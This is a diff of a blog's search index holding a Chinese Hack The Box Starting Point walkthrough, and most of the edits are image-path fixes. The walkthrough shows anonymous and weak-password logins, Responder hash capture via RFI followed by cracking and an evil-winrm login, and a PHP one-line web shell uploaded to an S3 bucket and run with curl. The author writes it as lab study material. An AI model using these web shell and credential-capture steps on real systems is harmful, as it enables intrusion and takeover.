@@ -24,7 +24,7 @@
   </entry>
   <entry>
     <title>htbのSTARTING POINT</title>
-    <url>/2022/09/23/STARTING%20POINT/</url>
+    <url>/2022/09/23/STARTING-POINT/</url>
     <content><![CDATA[<p><strong><code>想准备试试OSCP，HACK THE BOX还行，学习一些实战知识，以及一些概念了解，部分机器根据协议，我会总结知识点，不会给出全部</code></strong></p>
 <span id="more"></span>
 
@@ -48,7 +48,7 @@
 </blockquote>
 <h4 id="命令telnet"><a href="#命令telnet" class="headerlink" title="命令telnet"></a>命令<code>telnet</code></h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">telnet</span><span class="meta"> [target_ip]</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127011324556](STARTING POINT&#x2F;image-20230127011324556.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127011324556.png" alt="image-20230127011324556"></p>
 <h4 id="telnet和ssh的区别"><a href="#telnet和ssh的区别" class="headerlink" title="telnet和ssh的区别"></a>telnet和ssh的区别</h4><blockquote>
 <p>加密方式不同：**<code>telnet</code>是明码传输<strong>，</strong><code>SSH</code>是加密传输**。 <code>telnet</code>通过<code>TCP/IP</code>协议簇来访问远程终端，<code>传输的数据和口令是明文形式</code>。 相对来说不安全，你所有的数据都可被攻击者直接捕获。 <strong>SSH相对于telnet安全</strong>，它的<code>传输方式是以加密形式传输</code></p>
 </blockquote>
@@ -71,7 +71,7 @@
 <li><p>当您想在没有帐户的情况下登录时，通过 <code>FTP</code> 使用的用户名是什么？: <code>anonymous</code></p>
 </li>
 <li><p>我们得到的 FTP 消息“登录成功”的响应代码是什么？:<code>230</code></p>
-<p>![image-20230127001710275](STARTING POINT&#x2F;image-20230127001710275.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127001710275.png" alt="image-20230127001710275"></p>
 </li>
 <li><p>用于下载我们在 FTP 服务器上找到的文件的命令是什么？:<code>get</code></p>
 </li>
@@ -79,7 +79,7 @@
 </blockquote>
 <h4 id="命令ftp"><a href="#命令ftp" class="headerlink" title="命令ftp"></a>命令<code>ftp</code></h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ftp <span class="selector-attr">[USER@]</span>HOST <span class="selector-attr">[PORT]</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127011036214](STARTING POINT&#x2F;image-20230127011036214.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127011036214.png" alt="image-20230127011036214"></p>
 <h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><blockquote>
 <p>文件传输协议（File Transfer Protocol，FTP）是用于在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C?fromModule=lemma_inlink">网络</a>上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p>
 </blockquote>
@@ -106,10 +106,10 @@
 </blockquote>
 <h4 id="命令smbclient"><a href="#命令smbclient" class="headerlink" title="命令smbclient"></a>命令<code>smbclient</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> smbclient -L [target_ip]</span><br><span class="line">#列出所有可用共享</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127010237573](STARTING POINT&#x2F;image-20230127010237573.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127010237573.png" alt="image-20230127010237573"></p>
 <figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>[target_ip]<span class="symbol">\\</span>WorkShares</span><br><span class="line">#连接到 WorkShares</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127010626438](STARTING POINT&#x2F;image-20230127010626438.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127010626438.png" alt="image-20230127010626438"></p>
 <h4 id="什么是SMB"><a href="#什么是SMB" class="headerlink" title="什么是SMB"></a>什么是SMB</h4><blockquote>
 <p><code>SMB</code>是客户端与服务器的交互协议，客户端在其中请求文件，然后服务器将文件提供给客户端。</p>
 <p>现在，它是一个基于Windows的网络，使用户可以创建，修改和删除网络中的共享文件，文件夹，打印机。SMB是使用TCP端口445进行通信的应用程序分层协议。</p>
@@ -118,7 +118,7 @@
 <h4 id="SMB如何运作"><a href="#SMB如何运作" class="headerlink" title="SMB如何运作"></a>SMB如何运作</h4><blockquote>
 <p><code>SMB</code>是一种请求-响应协议，这意味着它在客户端和服务器之间传输多条消息以完成请求。</p>
 </blockquote>
-<h4 id="FTP-SMB-NFS的区别"><a href="#FTP-SMB-NFS的区别" class="headerlink" title="FTP, SMB, NFS的区别"></a>FTP, SMB, NFS的区别</h4><p>![image-20230127003921531](STARTING POINT&#x2F;image-20230127003921531.png)</p>
+<h4 id="FTP-SMB-NFS的区别"><a href="#FTP-SMB-NFS的区别" class="headerlink" title="FTP, SMB, NFS的区别"></a>FTP, SMB, NFS的区别</h4><p><img src="/2022/09/23/STARTING-POINT/image-20230127003921531.png" alt="image-20230127003921531"></p>
 <blockquote>
 <p><code>NFS</code> 最好，速度快点，配置复杂点<br><code>FTP</code> 最通用，最简单<br><code>SMB</code> 不太稳定，有时候Win 会提示找不到地址</p>
 </blockquote>
@@ -143,10 +143,10 @@
 </blockquote>
 <h4 id="命令redis-cli"><a href="#命令redis-cli" class="headerlink" title="命令redis-cli"></a>命令<code>redis-cli</code></h4><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">redis-<span class="keyword">cli</span> -h target_ip</span><br><span class="line"><span class="meta">#连接到 redis 服务器</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127145928047](STARTING POINT&#x2F;image-20230127145928047.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127145928047.png" alt="image-20230127145928047"></p>
 <figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">keys</span> * </span><br><span class="line"><span class="comment">#获取数据库中的所有键</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127145944398](STARTING POINT&#x2F;image-20230127145944398.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127145944398.png" alt="image-20230127145944398"></p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get</span> flag</span><br><span class="line"><span class="comment">#获取flag键值</span></span><br></pre></td></tr></table></figure>
 
 <p>【动态flag，不能展示.png】</p>
@@ -182,7 +182,7 @@
 </blockquote>
 <h4 id="命令xfreerdp"><a href="#命令xfreerdp" class="headerlink" title="命令xfreerdp"></a>命令xfreerdp</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">xfreerdp <span class="regexp">/v:10.129.31.107 /u</span>:administrator</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127174214417](STARTING POINT&#x2F;image-20230127174214417.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127174214417.png" alt="image-20230127174214417"></p>
 <h4 id="什么是RDP"><a href="#什么是RDP" class="headerlink" title="什么是RDP"></a>什么是RDP</h4><blockquote>
 <p><strong>远程桌面</strong>协议 ( <strong>RDP</strong> ) 是 Microsoft 开发的专有协议，它<code>为用户提供图形界面以通过网络连接到另一台计算机</code>。用户为此目的使用<strong>RDP客户端软件，而另一台计算机必须运行</strong> <strong>RDP</strong>服务器软件</p>
 </blockquote>
@@ -212,11 +212,11 @@
 </blockquote>
 <h4 id="命令gobuster"><a href="#命令gobuster" class="headerlink" title="命令gobuster"></a>命令gobuster</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirb<span class="regexp">/common.txt -u http:/</span><span class="regexp">/10.129.158.233/</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127211339954](STARTING POINT&#x2F;image-20230127211339954.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127211339954.png" alt="image-20230127211339954"></p>
 <p>【下面是由于我用的wsl，没用vm，无法启动chrome，于是用curl传post登录数据，没有要求直接弱密码】</p>
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://10.129.158.233/admin.php -X POST -d <span class="string">&quot;username=admin&amp;password=adm</span></span><br><span class="line"><span class="string">in&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230127211215675](STARTING POINT&#x2F;image-20230127211215675.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230127211215675.png" alt="image-20230127211215675"></p>
 <h4 id="什么是Gobuster"><a href="#什么是Gobuster" class="headerlink" title="什么是Gobuster"></a>什么是Gobuster</h4><blockquote>
 <p>Gobuster是Kali Linux默认安装的一款暴力扫描工具。 它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。 该工具支持对子域名和Web目录进行基于字典的暴力扫描。</p>
 </blockquote>
@@ -245,19 +245,19 @@
 </blockquote>
 <h4 id="命令mongo"><a href="#命令mongo" class="headerlink" title="命令mongo"></a>命令mongo</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mongo mongodb:<span class="regexp">//</span><span class="number">10.129</span>.<span class="number">173.130</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129215710939](STARTING POINT&#x2F;image-20230129215710939.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129215710939.png" alt="image-20230129215710939"></p>
 <figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129215752293](STARTING POINT&#x2F;image-20230129215752293.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129215752293.png" alt="image-20230129215752293"></p>
 <figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> sensitive_information</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129215912471](STARTING POINT&#x2F;image-20230129215912471.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129215912471.png" alt="image-20230129215912471"></p>
 <figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129215847534](STARTING POINT&#x2F;image-20230129215847534.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129215847534.png" alt="image-20230129215847534"></p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.flag</span><span class="selector-class">.find</span>()<span class="selector-class">.pretty</span>()</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129215955916](STARTING POINT&#x2F;image-20230129215955916.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129215955916.png" alt="image-20230129215955916"></p>
 <h4 id="什么是MongoDB"><a href="#什么是MongoDB" class="headerlink" title="什么是MongoDB"></a>什么是MongoDB</h4><blockquote>
 <p>MongoDB是一个基于分布式文件存储 [1] 的数据库。由<a href="https://baike.baidu.com/item/C%2B%2B?fromModule=lemma_inlink">C++</a>语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。</p>
 <p>MongoDB是一个介于<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93?fromModule=lemma_inlink">关系数据库</a>和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似<a href="https://baike.baidu.com/item/json?fromModule=lemma_inlink">json</a>的<a href="https://baike.baidu.com/item/bson?fromModule=lemma_inlink">bson</a>格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95?fromModule=lemma_inlink">索引</a>。</p>
@@ -280,15 +280,15 @@
 </blockquote>
 <h4 id="命令rsync"><a href="#命令rsync" class="headerlink" title="命令rsync"></a>命令rsync</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rsync</span> --list-only <span class="number">10.129.33.133</span>::</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129222433250](STARTING POINT&#x2F;image-20230129222433250.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129222433250.png" alt="image-20230129222433250"></p>
 <figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">rsync --list-only <span class="number">10.129.33.133</span><span class="number">::</span>public</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129222509164](STARTING POINT&#x2F;image-20230129222509164.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129222509164.png" alt="image-20230129222509164"></p>
 <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">rsync <span class="number">10.129</span>.<span class="number">33.133</span><span class="symbol">:</span><span class="symbol">:public/flag</span>.txt flag.txt</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230129223114091](STARTING POINT&#x2F;image-20230129223114091.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230129223114091.png" alt="image-20230129223114091"></p>
 <h4 id="什么是rsync"><a href="#什么是rsync" class="headerlink" title="什么是rsync"></a>什么是rsync</h4><blockquote>
 <p>rsync是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935?fromModule=lemma_inlink">linux系统</a>下的数据镜像备份工具。使用快速增量备份工具Remote Sync可以远程同步，支持本地复制，或者与其他SSH、rsync主机同步。</p>
 <p>已支持跨平台，可以在Windows与Linux间进行数据同步。</p>
@@ -356,14 +356,14 @@
 </blockquote>
 <h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230130000838109](STARTING POINT&#x2F;image-20230130000838109.png)</p>
-<p>![image-20230130000857706](STARTING POINT&#x2F;image-20230130000857706.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130000838109.png" alt="image-20230130000838109"></p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130000857706.png" alt="image-20230130000857706"></p>
 <p>扫描找到登录页面</p>
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230130002433765](STARTING POINT&#x2F;image-20230130002433765.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130002433765.png" alt="image-20230130002433765"></p>
 <p>然后抓包字典爆破得到账号密码，登录得到flag</p>
-<p>![image-20230130003936082](STARTING POINT&#x2F;image-20230130003936082.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130003936082.png" alt="image-20230130003936082"></p>
 <h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Tags-11"><a href="#Tags-11" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
 <p><code>WinRM</code></p>
 <p><code>网络</code></p>
@@ -394,21 +394,21 @@
 <p>然后由于靶机存在<code>RFI</code>，因此可以远程访问本地的某个文件，使用<code>responder</code>拿到主机的<code>administrator</code>的<strong>哈希</strong>，然后使用<code>john</code>破解。</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> tun0</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230130222039665](STARTING POINT&#x2F;image-20230130222039665.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130222039665.png" alt="image-20230130222039665"></p>
 <blockquote>
 <p>访问<code>http://unika.htb/index.php?page=//10.10.16.28/somefile</code></p>
 <p>[需要先修改<code>hosts</code>文件，把重定向ip修改到对应域名]</p>
 <p>这里ip为本地tun0网卡ip</p>
 </blockquote>
-<p>![image-20230130225041057](STARTING POINT&#x2F;image-20230130225041057.png)</p>
-<p>![image-20230130225118212](STARTING POINT&#x2F;image-20230130225118212.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130225041057.png" alt="image-20230130225041057"></p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130225118212.png" alt="image-20230130225118212"></p>
 <figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">john -t <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure>
 
 <p>得到密码</p>
 <p>evil-winrm登录</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.129</span>.<span class="number">198.112</span> -u Administrator -<span class="selector-tag">p</span> badminton</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230130232209879](STARTING POINT&#x2F;image-20230130232209879.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230130232209879.png" alt="image-20230130232209879"></p>
 <p><code>flag</code>在<code>mike</code>用户的<code>Desktop</code>目录中</p>
 <h4 id="什么是smb？"><a href="#什么是smb？" class="headerlink" title="什么是smb？"></a>什么是smb？</h4><blockquote>
 <p><em>SMB</em>(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</p>
@@ -454,21 +454,21 @@
 <p>列出该<code>s3存储桶</code>下的内容</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">aws s3 <span class="keyword">ls</span> <span class="params">--endpoint=http</span>:<span class="string">//s3.thetoppers.htb/</span> s3:<span class="string">//thetoppers.htb</span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230131004300879](STARTING POINT&#x2F;image-20230131004300879.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230131004300879.png" alt="image-20230131004300879"></p>
 <p>本地写一个<code>一句话木马脚本</code></p>
 <figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php </span></span><br></pre></td></tr></table></figure>
 
 <p>上传本地一句话木马到s3存储桶</p>
 <figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">aws</span> <span class="built_in">s3</span> <span class="meta">cp</span> shell.php --endpoint<span class="symbol">=http</span>:<span class="comment">//s3.thetoppers.htb/ s3://thetoppers.htb </span></span><br></pre></td></tr></table></figure>
 
-<p>![image-20230131004712717](STARTING POINT&#x2F;image-20230131004712717.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230131004712717.png" alt="image-20230131004712717"></p>
 <p>访问看看是否成功</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>thetoppers.htb/shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230131004810309](STARTING POINT&#x2F;image-20230131004810309.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230131004810309.png" alt="image-20230131004810309"></p>
 <p>然后蚁剑连接也行，但htb的vpn不走主机连不上</p>
 <p>所以可以利用nc反弹shell，也可以直接利用脚本在进行命令执行读取flag</p>
-<p>![image-20230131005440119](STARTING POINT&#x2F;image-20230131005440119.png)</p>
+<p><img src="/2022/09/23/STARTING-POINT/image-20230131005440119.png" alt="image-20230131005440119"></p>
 <h4 id="什么是aws？"><a href="#什么是aws？" class="headerlink" title="什么是aws？"></a>什么是aws？</h4><blockquote>
 <p>亚马逊<code>AWS（Amazon Web Services (AWS) ）</code>是亚马逊提供的<code>是全球最全面、应用最广泛的云平台</code>，从全球数据中心提供超过 200 项功能齐全的服务。数百万客户(包括增<code>长最快速的初创公司、最大型企业和主要的政府机构)都在使用 AWS</code> 来降低成本、提高敏捷性并加速创新。</p>
 </blockquote>
@@ -513,7 +513,7 @@
 <li><code>1234567890</code></li>
 </ol>
 </blockquote>
-<h1 id="第2层"><a href="#第2层" class="headerlink" title="第2层"></a>第2层</h1><h1 id><a href="#" class="headerlink" title></a></h1><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1>]]></content>
+<h1 id="第2层"><a href="#第2层" class="headerlink" title="第2层"></a>第2层</h1>]]></content>
       <categories>
         <category>Hack the Box</category>
       </categories>
